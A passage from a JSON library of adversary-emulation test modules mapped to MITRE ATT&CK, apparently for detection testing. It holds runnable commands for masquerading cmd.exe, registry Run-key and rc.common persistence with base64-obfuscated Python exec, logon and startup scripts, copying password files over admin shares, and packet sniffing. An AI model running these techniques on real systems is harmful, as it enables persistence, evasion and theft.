      "index": 184,
      "technique_id": "T1036.005",
      "technique_name": "Masquerading: Match Legitimate Name or Location",
      "description": "This test simulates an adversary renaming cmd.exe to VEDetector.exe to masquerade as a legitimate application.\nThe test copies cmd.exe, renames it to VEDetector.exe, adds a registry run key for persistence, and executes the renamed binary.\nThis technique may be used to evade detection by mimicking legitimate software names or locations.\n\n**Expected Output:**\n- A new process named VEDetector.exe appears in the process list, but its behavior matches cmd.exe.\n- SIEM/EDR systems may detect this as suspicious process activity (e.g., Sysmon Event ID 1 for process creation, or Event ID 13 for registry modifications).\n- Registry modification in HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run may trigger persistence alerts in XDR platforms.\n\n**References:**\n- [MITRE ATT&CK T1036.005](https://attack.mitre.org/techniques/T1036/005/)\n- [Sysmon Process Creation](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# Copy and rename cmd.exe to VEDetector.exe\nCopy-Item -Path \"#{source_file}\" -Destination \"#{ved_path}\\VEDetector.exe\" -Force\n\n# Create registry run key for persistence\nNew-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"VEDetector\" -Value \"#{ved_path}\\VEDetector.exe\" -PropertyType String -Force\n\n# Start the renamed process\nStart-Process -FilePath \"#{ved_path}\\VEDetector.exe\"\n\nStart-Sleep -Seconds 5\n",
        "elevation_required": true,
        "cleanup_command": "# Remove registry key\nRemove-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"VEDetector\" -ErrorAction SilentlyContinue\n\n# Stop the process\nStop-Process -Name \"VEDetector\" -Force -ErrorAction SilentlyContinue\n\n# Remove the file\nRemove-Item -Path \"#{ved_path}\\VEDetector.exe\" -Force -ErrorAction SilentlyContinue\n\nWrite-Host \"[+] Cleaned up VEDetector artifacts\"\n"
      },
      "variables": [
        {
          "name": "ved_path",
          "description": "Directory path where VEDetector.exe will be created",
          "type": "Path",
          "default_value": "$env:TEMP"
        },
        {
          "name": "source_file",
          "description": "Path to the source cmd.exe file",
          "type": "Path",
          "default_value": "$env:SystemRoot\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "The source cmd.exe file must exist on the system.\n",
          "check_command": "if (Test-Path \"#{source_file}\") { exit 0 } else { exit 1 }\n",
          "install_command": "Write-Host \"[-] Source file not found: #{source_file}. Ensure cmd.exe exists in the specified path.\"\nexit 1\n"
        }
      ],
      "rx_module_id": "03ae82a6-9fa0-465b-91df-124d8ca5c4e8",
      "module_name": "Masquerading cmd.exe as VEDetector.exe"
    },
    {
      "index": 185,
      "technique_id": "T1036.006",
      "technique_name": "Masquerading: Space after Filename",
      "description": "Space After Filename\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "89a7dd26-e510-4c9f-9b15-f3bae333360f",
      "module_name": "Space After Filename (Manual)"
    },
    {
      "index": 186,
      "technique_id": "T1036.006",
      "technique_name": "Masquerading: Space after Filename",
      "description": "Space after filename.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "mkdir -p /tmp/raglox-test-T1036.006\ncd /tmp/raglox-test-T1036.006\nmkdir -p 'testdirwithspaceend '\n[ \"$(uname)\" = 'FreeBSD' ] && /bin/echo \"#\\!/bin/sh\" > \"testdirwithspaceend /init \" && echo 'echo \"print(\\\"running T1035.006 with space after filename to masquerade init\\\")\" | python3.9' >> \"testdirwithspaceend /init \" && echo \"exit\" >> \"testdirwithspaceend /init \" || /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null\nchmod +x 'testdirwithspaceend /init '\n'./testdirwithspaceend /init '\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf /tmp/raglox-test-T1036.006"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b95ce2eb-a093-4cd8-938d-5258cef656ea",
      "module_name": "Space After Filename"
    },
    {
      "index": 187,
      "technique_id": "T1036.007",
      "technique_name": "Masquerading: Double File Extension",
      "description": "download and execute a file masquerading as images or Office files. Upon execution 3 calc instances and 3 vbs windows will be launched.\n\ne.g SOME_LEGIT_NAME.[doc,docx,xls,xlsx,pdf,rtf,png,jpg,etc.].[exe,vbs,js,ps1,etc] (Quartelyreport.docx.exe)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \"#{exe_path}\" %temp%\\T1036.007_masquerading.docx.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.pdf.exe /Y\ncopy \"#{exe_path}\" %temp%\\T1036.007_masquerading.ps1.exe /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xls.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.xlsx.vbs /Y\ncopy \"#{vbs_path}\" %temp%\\T1036.007_masquerading.png.vbs /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.doc.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.pdf.ps1 /Y\ncopy \"#{ps1_path}\" %temp%\\T1036.007_masquerading.rtf.ps1 /Y\n%temp%\\T1036.007_masquerading.docx.exe\n%temp%\\T1036.007_masquerading.pdf.exe\n%temp%\\T1036.007_masquerading.ps1.exe\n%temp%\\T1036.007_masquerading.xls.vbs\n%temp%\\T1036.007_masquerading.xlsx.vbs\n%temp%\\T1036.007_masquerading.png.vbs\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.doc.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.pdf.ps1\nC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File %temp%\\T1036.007_masquerading.rtf.ps1\n",
        "elevation_required": false,
        "cleanup_command": "del /f %temp%\\T1036.007_masquerading.docx.exe > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.pdf.exe > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.ps1.exe > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.xls.vbs > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.xlsx.vbs > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.png.vbs > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.doc.ps1 > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.pdf.ps1 > nul 2>&1\ndel /f %temp%\\T1036.007_masquerading.rtf.ps1 > nul 2>&1\n"
      },
      "variables": [
        {
          "name": "exe_path",
          "description": "path to exe to use when creating masquerading files",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\calc.exe"
        },
        {
          "name": "vbs_path",
          "description": "path of vbs to use when creating masquerading files",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1036.007\\src\\T1036.007_masquerading.vbs"
        },
        {
          "name": "ps1_path",
          "description": "path of powershell script to use when creating masquerading files",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1036.007\\src\\T1036.007_masquerading.ps1"
        }
      ],
      "prerequisites": [
        {
          "description": "File to copy must exist on disk at specified location (#{vbs_path})\n",
          "check_command": "if (Test-Path \"#{vbs_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{vbs_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1036.007/src/T1036.007_masquerading.vbs\" -OutFile \"#{vbs_path}\"\n"
        },
        {
          "description": "File to copy must exist on disk at specified location (#{ps1_path})\n",
          "check_command": "if (Test-Path \"#{ps1_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{ps1_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1036.007/src/T1036.007_masquerading.ps1\" -OutFile \"#{ps1_path}\"\n"
        }
      ],
      "rx_module_id": "c7fa0c3b-b57f-4cba-9118-863bf4e653fc",
      "module_name": "File Extension Masquerading"
    },
    {
      "index": 188,
      "technique_id": "T1037.001",
      "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Windows)",
      "description": "Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\\Environment key\nthat can be viewed in the Registry Editor.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"#{script_command}\" > #{script_path}\nREG.exe ADD HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d \"#{script_path}\" /f\n",
        "elevation_required": false,
        "cleanup_command": "REG.exe DELETE HKCU\\Environment /v UserInitMprLogonScript /f >nul 2>&1\ndel #{script_path} >nul 2>&1\ndel \"%USERPROFILE%\\desktop\\T1037.001-log.txt\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "script_path",
          "description": "Path to .bat file",
          "type": "string",
          "default_value": "%temp%\\art.bat"
        },
        {
          "name": "script_command",
          "description": "Command To Execute",
          "type": "string",
          "default_value": "echo Art \"Logon Script\" RAGLOX module was successful. >> %USERPROFILE%\\desktop\\T1037.001-log.txt"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d6042746-07d4-4c92-9ad8-e644c114a231",
      "module_name": "Logon Scripts"
    },
    {
      "index": 189,
      "technique_id": "T1037.002",
      "technique_name": "Boot or Logon Initialization Scripts: Logon Script (Mac)",
      "description": "Mac logon script\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "manual",
        "command": "",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f047c7de-a2d9-406e-a62b-12a09d9516f4",
      "module_name": "Logon Scripts - Mac"
    },
    {
      "index": 190,
      "technique_id": "T1037.004",
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "97a48daa-8bca-4bc0-b1a9-c1d163e762de",
      "module_name": "rc.common"
    },
    {
      "index": 191,
      "technique_id": "T1037.004",
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "description": "Modify rc.common\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n",
        "elevation_required": true,
        "cleanup_command": "origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c33f3d80-5f04-419b-a13a-854d1cbdbf3a",
      "module_name": "rc.common"
    },
    {
      "index": 192,
      "technique_id": "T1037.004",
      "technique_name": "Boot or Logon Initialization Scripts: Rc.common",
      "description": "Modify rc.local\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\n[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\necho \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n",
        "elevation_required": true,
        "cleanup_command": "origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "126f71af-e1c9-405c-94ef-26a47b16c102",
      "module_name": "rc.local"
    },
    {
      "index": 193,
      "technique_id": "T1037.005",
      "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
      "description": "Modify or create an file in /Library/StartupItems\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo touch /Library/StartupItems/EvilStartup.plist\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm /Library/StartupItems/EvilStartup.plist\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "134627c3-75db-410e-bff8-7a920075f198",
      "module_name": "Add file to Local Library StartupItems"
    },
    {
      "index": 194,
      "technique_id": "T1037.005",
      "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
      "description": "Add launch script to /Library/StartupItems to launch agent\n[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist\nsudo cp #{path_malicious_script} /Library/StartupItems/raglox.sh\nsudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist\nsudo /Library/StartupItems/raglox.sh start\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl unload /tmp/T1037_005_daemon.plist\nsudo rm /tmp/T1037_005_daemon.plist\nsudo rm /Library/StartupItems/raglox.sh\nsudo rm /Library/StartupItems/StartupParameters.plist\nsudo rm /tmp/T1037_005_daemon.txt\n"
      },
      "variables": [
        {
          "name": "path_malicious_script",
          "description": "Name of script to store in cron folder",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/T1037.005_daemon.sh"
        },
        {
          "name": "path_malicious_plist",
          "description": "Name of file to store in /tmp",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/T1037_005_daemon.plist"
        },
        {
          "name": "path_startup_params",
          "description": "Name of plist with startup params",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/StartupParameters.plist"
        }
      ],
      "prerequisites": [
        {
          "description": "/Library/StartupItems must exist\n",
          "check_command": "if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;\n",
          "install_command": "echo \"Failed to create /Library/StartupItems\"; exit 1;\n"
        },
        {
          "description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
          "check_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
        },
        {
          "description": "The startup script must exist on disk at specified location (#{path_malicious_script})\n",
          "check_command": "if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The startup script doesn't exist. Check the path and try again.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "fc369906-90c7-4a15-86fd-d37da624dde6",
      "module_name": "Add launch script to launch daemon"
    },
    {
      "index": 195,
      "technique_id": "T1037.005",
      "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
      "description": "Add launch script to /Library/StartupItems to launch agent\n[Example](https://cybersecurity.att.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist\nsudo cp #{path_malicious_script} /Library/StartupItems/raglox.sh\nsudo cp #{path_malicious_plist} /tmp/T1037_005_agent.plist\n/Library/StartupItems/raglox.sh start\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl unload /tmp/T1037_005_agent.plist\nsudo rm /tmp/T1037_005_agent.plist\nsudo rm /Library/StartupItems/raglox.sh\nsudo rm /Library/StartupItems/StartupParameters.plist\nsudo rm /tmp/T1037_005_agent.txt"
      },
      "variables": [
        {
          "name": "path_malicious_script",
          "description": "Name of script to store in cron folder",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/T1037.005_agent.sh"
        },
        {
          "name": "path_malicious_plist",
          "description": "Name of file to store in /tmp",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/T1037_005_agent.plist"
        },
        {
          "name": "path_startup_params",
          "description": "Name of plist with startup params",
          "type": "string",
          "default_value": "$PathToRagloxModulesFolder/T1037.005/src/StartupParameters.plist"
        }
      ],
      "prerequisites": [
        {
          "description": "/Library/StartupItems must exist\n",
          "check_command": "if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;\n",
          "install_command": "echo \"Failed to create /Library/StartupItems\"; exit 1;\n"
        },
        {
          "description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
          "check_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
        },
        {
          "description": "The startup script must exist on disk at specified location (#{path_malicious_script})\n",
          "check_command": "if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "echo \"The startup script doesn't exist. Check the path and try again.\"; exit 1;\n"
        }
      ],
      "rx_module_id": "10cf5bec-49dd-4ebf-8077-8f47e420096f",
      "module_name": "Add launch script to launch agent"
    },
    {
      "index": 196,
      "technique_id": "T1039",
      "technique_name": "Data from Network Shared Drive",
      "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}",
        "elevation_required": true,
        "cleanup_command": "del \\\\#{remote}\\C$\\#{share_file}\ndel %TEMP%\\#{local_file}"
      },
      "variables": [
        {
          "name": "remote",
          "description": "Remote server name",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "share_file",
          "description": "Remote Path to the file",
          "type": "path",
          "default_value": "Windows\\temp\\Easter_Bunny.password"
        },
        {
          "name": "local_file",
          "description": "Local name",
          "type": "string",
          "default_value": "Easter_egg.password"
        }
      ],
      "prerequisites": [
        {
          "description": "Administrative share must exist on #{remote}\n",
          "check_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"
        },
        {
          "description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n",
          "check_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n",
          "install_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"
        }
      ],
      "rx_module_id": "6ed67921-1774-44ba-bac6-adb51ed60660",
      "module_name": "Copy a sensitive File over Administrative share with copy"
    },
    {
      "index": 197,
      "technique_id": "T1039",
      "technique_name": "Data from Network Shared Drive",
      "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "copy-item -Path \"\\\\#{remote}\\C$\\#{share_file}\" -Destination \"$Env:TEMP\\#{local_file}\"",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"\\\\#{remote}\\C$\\#{share_file}\"\nRemove-Item -Path \"$Env:TEMP\\#{local_file}\""
      },
      "variables": [
        {
          "name": "remote",
          "description": "Remote server name",
          "type": "string",
          "default_value": "127.0.0.1"
        },
        {
          "name": "share_file",
          "description": "Remote Path to the file",
          "type": "path",
          "default_value": "Windows\\temp\\Easter_Bunny.password"
        },
        {
          "name": "local_file",
          "description": "Local name",
          "type": "string",
          "default_value": "Easter_egg.password"
        }
      ],
      "prerequisites": [
        {
          "description": "Administrative share must exist on #{remote}\n",
          "check_command": "if (Test-Path \"\\\\#{remote}\\C$\") {exit 0} else {exit 1}\n",
          "install_command": "Write-Host 'Please Enable \"C$\" share on #{remote}'\n"
        },
        {
          "description": "\"\\\\#{remote}\\C$\\#{share_file}\" must exist on #{remote}\n",
          "check_command": "if (Test-Path \"\\\\#{remote}\\C$\\#{share_file}\") {exit 0} else {exit 1}\n",
          "install_command": "Out-File -FilePath \"\\\\#{remote}\\C$\\#{share_file}\"\n"
        }
      ],
      "rx_module_id": "7762e120-5879-44ff-97f8-008b401b9a98",
      "module_name": "Copy a sensitive File over Administrative share with Powershell"
    },
    {
      "index": 198,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "interface",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "ens33"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if at least one of tcpdump or tshark is installed.\n",
          "check_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
        }
      ],
      "rx_module_id": "7fe741f7-b265-4951-a7c7-320889083b3e",
      "module_name": "Packet Capture Linux using tshark or tcpdump"
    },
    {
      "index": 199,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "tcpdump -c 5 -nnni #{interface}\ntshark -c 5 -i #{interface}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "interface",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "em0"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if at least one of tcpdump or tshark is installed.\n",
          "check_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which pkg && pkg install -y wireshark-nox11)\n"
        }
      ],
      "rx_module_id": "c93f2492-9ebe-44b5-8b45-36574cccfe67",
      "module_name": "Packet Capture FreeBSD using tshark or tcpdump"
    },
    {
      "index": 200,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "sudo tcpdump -c 5 -nnni #{interface}    \nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i #{interface}; fi;\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "interface",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "en0A"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if at least one of tcpdump or tshark is installed.\n",
          "check_command": "if [ ! -x \"$(command -v tcpdump)\" ] && [ ! -x \"$(command -v tshark)\" ]; then exit 1; else exit 0; fi;\n",
          "install_command": "(which yum && yum -y install epel-release tcpdump tshark)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
        }
      ],
      "rx_module_id": "9d04efee-eff5-4240-b8d2-07792b873608",
      "module_name": "Packet Capture macOS using tcpdump or tshark"
    },
    {
      "index": 201,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i #{interface} -c 5\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "interface",
          "description": "Specify interface to perform PCAP on.",
          "type": "string",
          "default_value": "Ethernet"
        },
        {
          "name": "wireshark_url",
          "description": "wireshark installer download URL",
          "type": "url",
          "default_value": "https://1.eu.dl.wireshark.org/win64/Wireshark-latest-x64.exe"
        },
        {
          "name": "tshark_path",
          "description": "path to tshark.exe",
          "type": "path",
          "default_value": "c:\\program files\\wireshark\\tshark.exe"
        },
        {
          "name": "npcap_url",
          "description": "npcap installed download URL",
          "type": "url",
          "default_value": "https://nmap.org/npcap/dist/npcap-1.31.exe"
        },
        {
          "name": "npcap_path",
          "description": "path to npcap.sys",
          "type": "path",
          "default_value": "C:\\Program Files\\Npcap\\npcap.sys"
        }
      ],
      "prerequisites": [
        {
          "description": "tshark must be installed and in the default path of \"c:\\Program Files\\Wireshark\\Tshark.exe\".\n",
          "check_command": "if (test-path \"#{tshark_path}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" #{wireshark_url}\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\wireshark_installer.exe\" /S\n"
        },
        {
          "description": "npcap must be installed.\n",
          "check_command": "if (test-path \"#{npcap_path}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\npcap_installer.exe\" #{npcap_url}\nStart-Process \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\npcap_installer.exe\"\n"
        }
      ],
      "rx_module_id": "a5b2f6a0-24b4-493e-9590-c699f75723ca",
      "module_name": "Packet Capture Windows Command Prompt"
    },
    {
      "index": 202,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10",
        "elevation_required": true,
        "cleanup_command": "netsh trace stop >nul 2>&1\nTIMEOUT /T 5 >nul 2>&1\ndel %temp%\\trace.etl >nul 2>&1\ndel %temp%\\trace.cab >nul 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b5656f67-d67f-4de8-8e62-b5581630f528",
      "module_name": "Windows Internal Packet Capture"
    },
    {
      "index": 203,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n",
        "elevation_required": true,
        "cleanup_command": "del %TEMP%\\t1040.etl"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c67ba807-f48b-446e-b955-e4928cd1bf91",
      "module_name": "Windows Internal pktmon capture"
    },
    {
      "index": 204,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
      "description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "pktmon.exe filter add -p 445\n",
        "elevation_required": true,
        "cleanup_command": "pktmon filter remove"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "855fb8b4-b8ab-4785-ae77-09f5df7bff55",
      "module_name": "Windows Internal pktmon set filter"
    },
    {
      "index": 205,
      "technique_id": "T1040",
      "technique_name": "Network Sniffing",
